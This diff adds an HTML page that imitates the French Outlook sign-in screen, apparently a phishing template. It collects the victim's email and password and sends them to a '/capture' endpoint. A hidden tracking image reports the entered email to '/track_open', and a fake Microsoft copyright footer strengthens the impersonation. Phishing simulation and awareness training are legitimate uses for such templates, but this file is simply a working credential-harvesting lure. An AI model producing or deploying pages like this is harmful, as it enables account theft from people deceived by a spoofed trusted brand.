@@ -1,0 +1,119 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook - Connexion</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 400px;
+        }
+        h2 {
+            text-align: center;
+            color: #0078d4;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            font-size: 14px;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078d4;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a99;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+    </style>
+    <script>
+        // Cette fonction sera appelée lors de la soumission du formulaire
+        function updateTrackingImage(event) {
+            var email = document.getElementById("email").value;
+            var trackingImg = document.getElementById("trackOpen");
+            // Met à jour l'URL de l'image de suivi avec l'email saisi
+            trackingImg.src = "/track_open?email=" + encodeURIComponent(email);
+            
+            // Permet au formulaire de se soumettre normalement après avoir mis à jour l'image
+            return true;
+        }
+
+        // Événement qui s'exécute lors de la soumission du formulaire
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Empêche l'envoi immédiat du formulaire pour effectuer la mise à jour de l'image
+
+            // Appeler la fonction updateTrackingImage pour effectuer l'enregistrement de l'événement de suivi
+            updateTrackingImage(event);
+
+            // Soumettre le formulaire après le suivi
+            event.target.submit();  // Soumettre le formulaire manuellement après le suivi
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2>Se connecter à Outlook</h2>
+        <form action="/capture" method="POST" id="loginForm">
+            <div class="form-group">
+                <label for="email">Adresse email ou numéro de téléphone</label>
+                <input type="text" id="email" name="email" placeholder="Entrez votre email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+
+        <!-- Image invisible pour suivre l'ouverture de la page avec l'email passé dans l'URL -->
+        <img src="/track_open?email={{ email }}" id="trackOpen" style="display:none;" alt="">
+
+        <div class="footer">
+            <p>&copy; 2025 Microsoft. Tous droits réservés.</p>
+        </div>
+    </div>
+
+    <script>
+        // Si l'utilisateur entre un email dans le formulaire, mettez à jour l'URL de l'image invisible
+        document.getElementById("loginForm").onsubmit = function() {
+            var email = document.getElementById("email").value;
+            // Mettez à jour l'URL de l'image pour inclure l'email saisi
+            document.getElementById("trackOpen").src = "/track_open?email=" + encodeURIComponent(email);
+        };
+    </script>
+</body>
+</html>
